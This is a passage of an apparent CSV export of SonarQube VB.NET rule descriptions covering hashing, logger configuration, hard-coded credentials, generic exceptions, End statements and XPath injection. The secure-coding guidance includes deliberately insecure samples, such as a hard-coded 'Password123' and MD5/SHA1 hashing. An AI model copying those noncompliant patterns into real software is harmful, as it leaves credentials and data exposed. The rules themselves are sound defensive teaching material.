  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",vbnet:S4790,vbnet,VB.NET,"<p>Hashing data is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9233"">CVE-2018-9233</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-5097"">CVE-2013-5097</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1051"">CVE-2007-1051</a> </li>
</ul>
<p>Cryptographic hash functions are used to uniquely identify information without storing their original form. When not done properly, an attacker can
steal the original information by guessing it (ex: with a <a href=""https://en.wikipedia.org/wiki/Rainbow_table"">rainbow table</a>), or replace the
original data with another one having the same hash.</p>
<p>This rule flags code that initiates hashing.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the hashed value is used in a security context. </li>
  <li> the hashing algorithm you are using is known to have vulnerabilities. </li>
  <li> <a href=""https://en.wikipedia.org/wiki/Salt_(cryptography)"">salts</a> are not automatically generated and applied by the hashing function.
  </li>
  <li> any generated salts are cryptographically weak or not credential-specific. </li>
</ul>
<p>You are at risk if you answered yes to the first question and any of the following ones.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> for security related purposes, use only hashing algorithms which are <a
  href=""https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet"">currently known to be strong</a>. Avoid using algorithms like MD5 and SHA1
  completely in security contexts. </li>
  <li> do not define your own hashing- or salt algorithms as they will most probably have flaws. </li>
  <li> do not use algorithms that compute too quickly, like SHA256, as it must remain beyond modern hardware capabilities to perform brute force and
  dictionary based attacks. </li>
  <li> use a hashing algorithm that generate its own salts as part of the hashing. If you generate your own salts, make sure that a cryptographically
  strong salt algorithm is used, that generated salts are credential-specific, and finally, that the salt is applied correctly before the hashing.
  </li>
  <li> save both the salt and the hashed value in the relevant database record; during future validation operations, the salt and hash can then be
  retrieved from the database. The hash is recalculated with the stored salt and the value being validated, and the result compared to the stored
  hash. </li>
  <li> the strength of hashing algorithms often decreases over time as hardware capabilities increase. Check regularly that the algorithms you are
  using are still considered secure. If needed, rehash your data using a stronger algorithm. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
Imports System.Security.Cryptography

Sub ComputeHash()

    ' Review all instantiations of classes that inherit from HashAlgorithm, for example:
    Dim hashAlgo As HashAlgorithm = HashAlgorithm.Create() ' Questionable
    Dim hashAlgo2 As HashAlgorithm = HashAlgorithm.Create(""SHA1"") ' Questionable
    Dim sha As SHA1 = New SHA1CryptoServiceProvider() ' Questionable
    Dim md5 As MD5 = New MD5CryptoServiceProvider() ' Questionable

    ' ...
End Sub

Class MyHashAlgorithm
    Inherits HashAlgorithm ' Questionable

    ' ...
End Class
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/916.html"">MITRE, CWE-916</a> - Use of Password Hash With Insufficient Computational Effort
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/759.html"">MITRE, CWE-759</a> - Use of a One-Way Hash without a Salt </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/760.html"">MITRE, CWE-760</a> - Use of a One-Way Hash with a Predictable Salt </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Hashing data is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a3', 'sans-top25-porous']",SECURITY_HOTSPOT
2018-11-29T11:10:38+0100,"<p>Configuring loggers is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0285"">CVE-2018-0285</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-1127"">CVE-2000-1127</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-15113"">CVE-2017-15113</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5742"">CVE-2015-5742</a> </li>
</ul>
<p>Logs are useful before, during and after a security incident.</p>
<ul>
  <li> Attackers will most of the time start their nefarious work by probing the system for vulnerabilities. Monitoring this activity and stopping it
  is the first step to prevent an attack from ever happening. </li>
  <li> In case of a successful attack, logs should contain enough information to understand what damage an attacker may have inflicted. </li>
</ul>
<p>Logs are also a target for attackers because they might contain sensitive information. Configuring loggers has an impact on the type of information
logged and how they are logged.</p>
<p>This rule flags for review code that initiates loggers configuration. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> unauthorized users might have access to the logs, either because they are stored in an insecure location or because the application gives
  access to them. </li>
  <li> the logs contain sensitive information on a production server. This can happen when the logger is in debug mode. </li>
  <li> the log can grow without limit. This can happen when additional information is written into logs every time a user performs an action and the
  user can perform the action as many times as he/she wants. </li>
  <li> the logs do not contain enough information to understand the damage an attacker might have inflicted. The loggers mode (info, warn, error)
  might filter out important information. They might not print contextual information like the precise time of events or the server hostname. </li>
  <li> the logs are only stored locally instead of being backuped or replicated. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Check that your production deployment doesn't have its loggers in ""debug"" mode as it might write sensitive information in logs. </li>
  <li> Production logs should be stored in a secure location which is only accessible to system administrators. </li>
  <li> Configure the loggers to display all warnings, info and error messages. Write relevant information such as the precise time of events and the
  hostname. </li>
  <li> Choose log format which is easy to parse and process automatically. It is important to process logs rapidly in case of an attack so that the
  impact is known and limited. </li>
  <li> Check that the permissions of the log files are correct. If you index the logs in some other service, make sure that the transfer and the
  service are secure too. </li>
  <li> Add limits to the size of the logs and make sure that no user can fill the disk with logs. This can happen even when the user does not control
  the logged information. An attacker could just repeat a logged action many times. </li>
</ul>
<p>Remember that configuring loggers properly doesn't make them bullet-proof. Here is a list of recommendations explaining on how to use your
logs:</p>
<ul>
  <li> Don't log any sensitive information. This obviously includes passwords and credit card numbers but also any personal information such as user
  names, locations, etc... Usually any information which is protected by law is good candidate for removal. </li>
  <li> Sanitize all user inputs before writing them in the logs. This includes checking its size, content, encoding, syntax, etc... As for any user
  input, validate using whitelists whenever possible. Enabling users to write what they want in your logs can have many impacts. It could for example
  use all your storage space or compromise your log indexing service. </li>
  <li> Log enough information to monitor suspicious activities and evaluate the impact an attacker might have on your systems. Register events such as
  failed logins, successful logins, server side input validation failures, access denials and any important transaction. </li>
  <li> Monitor the logs for any suspicious activity. </li>
</ul>
<p>See</p>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/532.html"">MITRE, CWE-532</a> - Information Exposure Through Log Files </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/117.html"">MITRE, CWE-117</a> - Improper Output Neutralization for Logs </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/778.html"">MITRE, CWE-778</a> - Insufficient Logging </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> OWASP Top 10 2017 Category A10 - Insufficient Logging &amp; Monitoring </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>
<h2>Questionable Code Example</h2>
<p><strong>.Net Core</strong>: configure programmatically</p>
<pre>
Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports Microsoft.AspNetCore
Imports Microsoft.AspNetCore.Builder
Imports Microsoft.AspNetCore.Hosting
Imports Microsoft.Extensions.Configuration
Imports Microsoft.Extensions.DependencyInjection
Imports Microsoft.Extensions.Logging
Imports Microsoft.Extensions.Options

Namespace MvcApp

    Public Class ProgramLogging

        Public Shared Function CreateWebHostBuilder(args As String()) As IWebHostBuilder

            WebHost.CreateDefaultBuilder(args) _
                .ConfigureLogging(Function(hostingContext, Logging) ' Questionable
                                      ' ...
                                  End Function) _
            .UseStartup(Of StartupLogging)()

            '...
        End Function
    End Class


    Public Class StartupLogging

        Public Sub ConfigureServices(services As IServiceCollection)

            services.AddLogging(Function(logging) ' Questionable
                                    '...
                                End Function)
        End Sub

        Public Sub Configure(app As IApplicationBuilder, env As IHostingEnvironment, loggerFactory As ILoggerFactory)

            Dim config As IConfiguration = Nothing
            Dim level As LogLevel = LogLevel.Critical
            Dim includeScopes As Boolean = False
            Dim filter As Func(Of String, Microsoft.Extensions.Logging.LogLevel, Boolean) = Nothing
            Dim consoleSettings As Microsoft.Extensions.Logging.Console.IConsoleLoggerSettings = Nothing
            Dim azureSettings As Microsoft.Extensions.Logging.AzureAppServices.AzureAppServicesDiagnosticsSettings = Nothing
            Dim eventLogSettings As Microsoft.Extensions.Logging.EventLog.EventLogSettings = Nothing

            ' An issue will be raised for each call to an ILoggerFactory extension methods adding loggers.
            loggerFactory.AddAzureWebAppDiagnostics() ' Questionable
            loggerFactory.AddAzureWebAppDiagnostics(azureSettings) ' Questionable
            loggerFactory.AddConsole() ' Questionable
            loggerFactory.AddConsole(level) ' Questionable
            loggerFactory.AddConsole(level, includeScopes) ' Questionable
            loggerFactory.AddConsole(filter) ' Questionable
            loggerFactory.AddConsole(filter, includeScopes) ' Questionable
            loggerFactory.AddConsole(config) ' Questionable
            loggerFactory.AddConsole(consoleSettings) ' Questionable
            loggerFactory.AddDebug() ' Questionable
            loggerFactory.AddDebug(level) ' Questionable
            loggerFactory.AddDebug(filter) ' Questionable
            loggerFactory.AddEventLog() ' Questionable
            loggerFactory.AddEventLog(eventLogSettings) ' Questionable
            loggerFactory.AddEventLog(level) ' Questionable
            ' Only available for NET Standard 2.0 and above
            'loggerFactory.AddEventSourceLogger() ' Questionable

            Dim providers As IEnumerable(Of ILoggerProvider) = Nothing
            Dim filterOptions1 As LoggerFilterOptions = Nothing
            Dim filterOptions2 As IOptionsMonitor(Of LoggerFilterOptions) = Nothing

            Dim factory As LoggerFactory = New LoggerFactory() ' Questionable
            factory = New LoggerFactory(providers) ' Questionable
            factory = New LoggerFactory(providers, filterOptions1) ' Questionable
            factory = New LoggerFactory(providers, filterOptions2) ' Questionable
        End Sub
    End Class
End Namespace
</pre>
<p><strong>Log4Net</strong></p>
<pre>
Imports System
Imports System.IO
Imports System.Xml
Imports log4net.Appender
Imports log4net.Config
Imports log4net.Repository

Namespace Logging
    Class Log4netLogging
        Private Sub Foo(ByVal repository As ILoggerRepository, ByVal element As XmlElement, ByVal configFile As FileInfo, ByVal configUri As Uri, ByVal configStream As Stream, ByVal appender As IAppender, ParamArray appenders As IAppender())
            log4net.Config.XmlConfigurator.Configure(repository) ' Questionable
            log4net.Config.XmlConfigurator.Configure(repository, element) ' Questionable
            log4net.Config.XmlConfigurator.Configure(repository, configFile) ' Questionable
            log4net.Config.XmlConfigurator.Configure(repository, configUri) ' Questionable
            log4net.Config.XmlConfigurator.Configure(repository, configStream) ' Questionable
            log4net.Config.XmlConfigurator.ConfigureAndWatch(repository, configFile) ' Questionable

            log4net.Config.DOMConfigurator.Configure() ' Questionable
            log4net.Config.DOMConfigurator.Configure(repository) ' Questionable
            log4net.Config.DOMConfigurator.Configure(element) ' Questionable
            log4net.Config.DOMConfigurator.Configure(repository, element) ' Questionable
            log4net.Config.DOMConfigurator.Configure(configFile) ' Questionable
            log4net.Config.DOMConfigurator.Configure(repository, configFile) ' Questionable
            log4net.Config.DOMConfigurator.Configure(configStream) ' Questionable
            log4net.Config.DOMConfigurator.Configure(repository, configStream) ' Questionable
            log4net.Config.DOMConfigurator.ConfigureAndWatch(configFile) ' Questionable
            log4net.Config.DOMConfigurator.ConfigureAndWatch(repository, configFile) ' Questionable

            log4net.Config.BasicConfigurator.Configure() ' Questionable
            log4net.Config.BasicConfigurator.Configure(appender) ' Questionable
            log4net.Config.BasicConfigurator.Configure(appenders) ' Questionable
            log4net.Config.BasicConfigurator.Configure(repository) ' Questionable
            log4net.Config.BasicConfigurator.Configure(repository, appender) ' Questionable
            log4net.Config.BasicConfigurator.Configure(repository, appenders) ' Questionable
        End Sub
    End Class
End Namespace
</pre>
<p><strong>NLog</strong>: configure programmatically</p>
<pre>
Namespace Logging
    Class NLogLogging
        Private Sub Foo(ByVal config As NLog.Config.LoggingConfiguration)
            NLog.LogManager.Configuration = config ' Questionable
        End Sub
    End Class
End Namespace
</pre>
<p><strong>Serilog</strong></p>
<pre>
Namespace Logging
    Class SerilogLogging
        Private Sub Foo()
            Dim config As Serilog.LoggerConfiguration = New Serilog.LoggerConfiguration() ' Questionable
        End Sub
    End Class
End Namespace
</pre>",vbnet:S4792,vbnet,VB.NET,"<p>Configuring loggers is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0285"">CVE-2018-0285</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-1127"">CVE-2000-1127</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-15113"">CVE-2017-15113</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5742"">CVE-2015-5742</a> </li>
</ul>
<p>Logs are useful before, during and after a security incident.</p>
<ul>
  <li> Attackers will most of the time start their nefarious work by probing the system for vulnerabilities. Monitoring this activity and stopping it
  is the first step to prevent an attack from ever happening. </li>
  <li> In case of a successful attack, logs should contain enough information to understand what damage an attacker may have inflicted. </li>
</ul>
<p>Logs are also a target for attackers because they might contain sensitive information. Configuring loggers has an impact on the type of information
logged and how they are logged.</p>
<p>This rule flags for review code that initiates loggers configuration. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> unauthorized users might have access to the logs, either because they are stored in an insecure location or because the application gives
  access to them. </li>
  <li> the logs contain sensitive information on a production server. This can happen when the logger is in debug mode. </li>
  <li> the log can grow without limit. This can happen when additional information is written into logs every time a user performs an action and the
  user can perform the action as many times as he/she wants. </li>
  <li> the logs do not contain enough information to understand the damage an attacker might have inflicted. The loggers mode (info, warn, error)
  might filter out important information. They might not print contextual information like the precise time of events or the server hostname. </li>
  <li> the logs are only stored locally instead of being backuped or replicated. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Check that your production deployment doesn't have its loggers in ""debug"" mode as it might write sensitive information in logs. </li>
  <li> Production logs should be stored in a secure location which is only accessible to system administrators. </li>
  <li> Configure the loggers to display all warnings, info and error messages. Write relevant information such as the precise time of events and the
  hostname. </li>
  <li> Choose log format which is easy to parse and process automatically. It is important to process logs rapidly in case of an attack so that the
  impact is known and limited. </li>
  <li> Check that the permissions of the log files are correct. If you index the logs in some other service, make sure that the transfer and the
  service are secure too. </li>
  <li> Add limits to the size of the logs and make sure that no user can fill the disk with logs. This can happen even when the user does not control
  the logged information. An attacker could just repeat a logged action many times. </li>
</ul>
<p>Remember that configuring loggers properly doesn't make them bullet-proof. Here is a list of recommendations explaining on how to use your
logs:</p>
<ul>
  <li> Don't log any sensitive information. This obviously includes passwords and credit card numbers but also any personal information such as user
  names, locations, etc... Usually any information which is protected by law is good candidate for removal. </li>
  <li> Sanitize all user inputs before writing them in the logs. This includes checking its size, content, encoding, syntax, etc... As for any user
  input, validate using whitelists whenever possible. Enabling users to write what they want in your logs can have many impacts. It could for example
  use all your storage space or compromise your log indexing service. </li>
  <li> Log enough information to monitor suspicious activities and evaluate the impact an attacker might have on your systems. Register events such as
  failed logins, successful logins, server side input validation failures, access denials and any important transaction. </li>
  <li> Monitor the logs for any suspicious activity. </li>
</ul>
<p>See</p>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/532.html"">MITRE, CWE-532</a> - Information Exposure Through Log Files </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/117.html"">MITRE, CWE-117</a> - Improper Output Neutralization for Logs </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/778.html"">MITRE, CWE-778</a> - Insufficient Logging </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> OWASP Top 10 2017 Category A10 - Insufficient Logging &amp; Monitoring </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>
<h2>Questionable Code Example</h2>
<p><strong>.Net Core</strong>: configure programmatically</p>
<pre>
Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports Microsoft.AspNetCore
Imports Microsoft.AspNetCore.Builder
Imports Microsoft.AspNetCore.Hosting
Imports Microsoft.Extensions.Configuration
Imports Microsoft.Extensions.DependencyInjection
Imports Microsoft.Extensions.Logging
Imports Microsoft.Extensions.Options

Namespace MvcApp

    Public Class ProgramLogging

        Public Shared Function CreateWebHostBuilder(args As String()) As IWebHostBuilder

            WebHost.CreateDefaultBuilder(args) _
                .ConfigureLogging(Function(hostingContext, Logging) ' Questionable
                                      ' ...
                                  End Function) _
            .UseStartup(Of StartupLogging)()

            '...
        End Function
    End Class


    Public Class StartupLogging

        Public Sub ConfigureServices(services As IServiceCollection)

            services.AddLogging(Function(logging) ' Questionable
                                    '...
                                End Function)
        End Sub

        Public Sub Configure(app As IApplicationBuilder, env As IHostingEnvironment, loggerFactory As ILoggerFactory)

            Dim config As IConfiguration = Nothing
            Dim level As LogLevel = LogLevel.Critical
            Dim includeScopes As Boolean = False
            Dim filter As Func(Of String, Microsoft.Extensions.Logging.LogLevel, Boolean) = Nothing
            Dim consoleSettings As Microsoft.Extensions.Logging.Console.IConsoleLoggerSettings = Nothing
            Dim azureSettings As Microsoft.Extensions.Logging.AzureAppServices.AzureAppServicesDiagnosticsSettings = Nothing
            Dim eventLogSettings As Microsoft.Extensions.Logging.EventLog.EventLogSettings = Nothing

            ' An issue will be raised for each call to an ILoggerFactory extension methods adding loggers.
            loggerFactory.AddAzureWebAppDiagnostics() ' Questionable
            loggerFactory.AddAzureWebAppDiagnostics(azureSettings) ' Questionable
            loggerFactory.AddConsole() ' Questionable
            loggerFactory.AddConsole(level) ' Questionable
            loggerFactory.AddConsole(level, includeScopes) ' Questionable
            loggerFactory.AddConsole(filter) ' Questionable
            loggerFactory.AddConsole(filter, includeScopes) ' Questionable
            loggerFactory.AddConsole(config) ' Questionable
            loggerFactory.AddConsole(consoleSettings) ' Questionable
            loggerFactory.AddDebug() ' Questionable
            loggerFactory.AddDebug(level) ' Questionable
            loggerFactory.AddDebug(filter) ' Questionable
            loggerFactory.AddEventLog() ' Questionable
            loggerFactory.AddEventLog(eventLogSettings) ' Questionable
            loggerFactory.AddEventLog(level) ' Questionable
            ' Only available for NET Standard 2.0 and above
            'loggerFactory.AddEventSourceLogger() ' Questionable

            Dim providers As IEnumerable(Of ILoggerProvider) = Nothing
            Dim filterOptions1 As LoggerFilterOptions = Nothing
            Dim filterOptions2 As IOptionsMonitor(Of LoggerFilterOptions) = Nothing

            Dim factory As LoggerFactory = New LoggerFactory() ' Questionable
            factory = New LoggerFactory(providers) ' Questionable
            factory = New LoggerFactory(providers, filterOptions1) ' Questionable
            factory = New LoggerFactory(providers, filterOptions2) ' Questionable
        End Sub
    End Class
End Namespace
</pre>
<p><strong>Log4Net</strong></p>
<pre>
Imports System
Imports System.IO
Imports System.Xml
Imports log4net.Appender
Imports log4net.Config
Imports log4net.Repository

Namespace Logging
    Class Log4netLogging
        Private Sub Foo(ByVal repository As ILoggerRepository, ByVal element As XmlElement, ByVal configFile As FileInfo, ByVal configUri As Uri, ByVal configStream As Stream, ByVal appender As IAppender, ParamArray appenders As IAppender())
            log4net.Config.XmlConfigurator.Configure(repository) ' Questionable
            log4net.Config.XmlConfigurator.Configure(repository, element) ' Questionable
            log4net.Config.XmlConfigurator.Configure(repository, configFile) ' Questionable
            log4net.Config.XmlConfigurator.Configure(repository, configUri) ' Questionable
            log4net.Config.XmlConfigurator.Configure(repository, configStream) ' Questionable
            log4net.Config.XmlConfigurator.ConfigureAndWatch(repository, configFile) ' Questionable

            log4net.Config.DOMConfigurator.Configure() ' Questionable
            log4net.Config.DOMConfigurator.Configure(repository) ' Questionable
            log4net.Config.DOMConfigurator.Configure(element) ' Questionable
            log4net.Config.DOMConfigurator.Configure(repository, element) ' Questionable
            log4net.Config.DOMConfigurator.Configure(configFile) ' Questionable
            log4net.Config.DOMConfigurator.Configure(repository, configFile) ' Questionable
            log4net.Config.DOMConfigurator.Configure(configStream) ' Questionable
            log4net.Config.DOMConfigurator.Configure(repository, configStream) ' Questionable
            log4net.Config.DOMConfigurator.ConfigureAndWatch(configFile) ' Questionable
            log4net.Config.DOMConfigurator.ConfigureAndWatch(repository, configFile) ' Questionable

            log4net.Config.BasicConfigurator.Configure() ' Questionable
            log4net.Config.BasicConfigurator.Configure(appender) ' Questionable
            log4net.Config.BasicConfigurator.Configure(appenders) ' Questionable
            log4net.Config.BasicConfigurator.Configure(repository) ' Questionable
            log4net.Config.BasicConfigurator.Configure(repository, appender) ' Questionable
            log4net.Config.BasicConfigurator.Configure(repository, appenders) ' Questionable
        End Sub
    End Class
End Namespace
</pre>
<p><strong>NLog</strong>: configure programmatically</p>
<pre>
Namespace Logging
    Class NLogLogging
        Private Sub Foo(ByVal config As NLog.Config.LoggingConfiguration)
            NLog.LogManager.Configuration = config ' Questionable
        End Sub
    End Class
End Namespace
</pre>
<p><strong>Serilog</strong></p>
<pre>
Namespace Logging
    Class SerilogLogging
        Private Sub Foo()
            Dim config As Serilog.LoggerConfiguration = New Serilog.LoggerConfiguration() ' Questionable
        End Sub
    End Class
End Namespace
</pre>",Configuring loggers is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a10', 'owasp-a3', 'sans-top25-porous']",SECURITY_HOTSPOT
2018-11-06T12:16:59+0100,"<p>Because it is easy to extract strings from a compiled application, credentials should never be hard-coded. Do so, and they're almost guaranteed to
end up in the hands of an attacker. This is particularly true for applications that are distributed.</p>
<p>Credentials should be stored outside of the code in a strongly-protected encrypted configuration file or database.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Dim username As String = ""admin""
Dim password As String = ""Password123""
Dim usernamePassword As String = ""user=admin&amp;password=Password123""
Dim usernamePassword2 As String = ""user=admin&amp;"" &amp; ""password="" &amp; password
</pre>
<h2>Compliant Solution</h2>
<pre>
Dim username As String = ""admin""
Dim password As String = GetEncryptedPassword()
Dim usernamePassword As String = String.Format(""user={0}&amp;password={1}"", GetEncryptedUsername(), GetEncryptedPassword())
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/798"">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/259"">MITRE, CWE-259</a> - Use of Hard-coded Password </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/qQCHAQ"">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
  <li> OWASP Top 10 2017 Category A2 - Broken Authentication </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
  <li> Derived from FindSecBugs rule <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD"">Hard Coded Password</a> </li>
</ul>",vbnet:S2068,vbnet,VB.NET,"<p>Because it is easy to extract strings from a compiled application, credentials should never be hard-coded. Do so, and they're almost guaranteed to
end up in the hands of an attacker. This is particularly true for applications that are distributed.</p>
<p>Credentials should be stored outside of the code in a strongly-protected encrypted configuration file or database.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Dim username As String = ""admin""
Dim password As String = ""Password123""
Dim usernamePassword As String = ""user=admin&amp;password=Password123""
Dim usernamePassword2 As String = ""user=admin&amp;"" &amp; ""password="" &amp; password
</pre>
<h2>Compliant Solution</h2>
<pre>
Dim username As String = ""admin""
Dim password As String = GetEncryptedPassword()
Dim usernamePassword As String = String.Format(""user={0}&amp;password={1}"", GetEncryptedUsername(), GetEncryptedPassword())
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/798"">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/259"">MITRE, CWE-259</a> - Use of Hard-coded Password </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/qQCHAQ"">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
  <li> OWASP Top 10 2017 Category A2 - Broken Authentication </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
  <li> Derived from FindSecBugs rule <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD"">Hard Coded Password</a> </li>
</ul>",Credentials should not be hard-coded,"[{'key': 'credentialWords', 'htmlDesc': 'Comma separated list of words identifying potential credentials', 'defaultValue': 'password, passwd, pwd', 'type': 'STRING'}]",BLOCKER,"['cert', 'cwe', 'owasp-a2', 'sans-top25-porous']",VULNERABILITY
2017-11-14T07:57:44+0100,"<p>Throwing such general exceptions as <code>Exception</code>, <code>SystemException</code>, <code>ApplicationException</code>,
<code>IndexOutOfRangeException</code>, <code>NullReferenceException</code>, <code>OutOfMemoryException</code> and
<code>ExecutionEngineException</code> prevents calling methods from handling true, system-generated exceptions differently than application-generated
errors. </p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Sub DoSomething(obj As Object)
  If obj Is Nothing Then
    ' Noncompliant
    Throw New NullReferenceException(""obj"")
  End If
  ' ...
End Sub
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Sub DoSomething(obj As Object)
  If obj Is Nothing Then
    Throw New ArgumentNullException(""obj"")
  End If
  ' ...
End Sub
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/397.html"">MITRE, CWE-397</a> - Declaration of Throws for Generic Exception </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/BoB3AQ"">CERT, ERR07-J.</a> - Do not throw RuntimeException, Exception, or Throwable
  </li>
</ul>",vbnet:S112,vbnet,VB.NET,"<p>Throwing such general exceptions as <code>Exception</code>, <code>SystemException</code>, <code>ApplicationException</code>,
<code>IndexOutOfRangeException</code>, <code>NullReferenceException</code>, <code>OutOfMemoryException</code> and
<code>ExecutionEngineException</code> prevents calling methods from handling true, system-generated exceptions differently than application-generated
errors. </p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Sub DoSomething(obj As Object)
  If obj Is Nothing Then
    ' Noncompliant
    Throw New NullReferenceException(""obj"")
  End If
  ' ...
End Sub
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Sub DoSomething(obj As Object)
  If obj Is Nothing Then
    Throw New ArgumentNullException(""obj"")
  End If
  ' ...
End Sub
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/397.html"">MITRE, CWE-397</a> - Declaration of Throws for Generic Exception </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/BoB3AQ"">CERT, ERR07-J.</a> - Do not throw RuntimeException, Exception, or Throwable
  </li>
</ul>",General exceptions should never be thrown,[],MAJOR,"['cert', 'cwe', 'error-handling']",CODE_SMELL
2016-11-07T15:36:18+0100,"<p><code>End</code> statements exit the control flow of the program in an unstructured way. This statement stops code execution immediately without
executing <code>Dispose</code> or <code>Finalize</code> methods, or executing <code>Finally</code> blocks. Therefore, it should be avoided.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
    Sub Print(ByVal str As String)
       Try
            ...
            End       ' Noncompliant
        Finally
            ' do something important here
            ...
        End Try
    End Sub
End Module
</pre>",vbnet:S1147,vbnet,VB.NET,"<p><code>End</code> statements exit the control flow of the program in an unstructured way. This statement stops code execution immediately without
executing <code>Dispose</code> or <code>Finalize</code> methods, or executing <code>Finally</code> blocks. Therefore, it should be avoided.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
    Sub Print(ByVal str As String)
       Try
            ...
            End       ' Noncompliant
        Finally
            ' do something important here
            ...
        End Try
    End Sub
End Module
</pre>","""End"" statements should not be used",[],BLOCKER,"['cert', 'cwe', 'suspicious']",CODE_SMELL
2018-11-29T11:10:38+0100,"<p>Executing XPATH expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6272"">CVE-2016-6272</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9149"">CVE-2016-9149</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4837"">CVE-2012-4837</a> </li>
</ul>
<p>User provided data such as URL parameters should always be considered as untrusted and tainted. Constructing XPath expressions directly from
tainted data enables attackers to inject specially crafted values that changes the initial meaning of the expression itself. Successful XPath
injections attacks can read sensitive information from the XML document.</p>
<p>This rule will create issues when the following methods are called:</p>
<ul>
  <li> <code>System.Xml.XmlNode.SelectNodes(string)</code> </li>
  <li> <code>System.Xml.XmlNode.SelectNodes(string, System.Xml.XmlNamespaceManager)</code> </li>
  <li> <code>System.Xml.XmlNode.SelectSingleNode(string)</code> </li>
  <li> <code>System.Xml.XmlNode.SelectSingleNode(string, System.Xml.XmlNamespaceManager)</code> </li>
  <li> <code>System.Xml.XPath.XPathNavigator.Compile(string)</code> </li>
  <li> <code>System.Xml.XPath.XPathNavigator.Evaluate(string)</code> </li>
  <li> <code>System.Xml.XPath.XPathNavigator.Evaluate(string, System.Xml.IXmlNamespaceResolver)</code> </li>
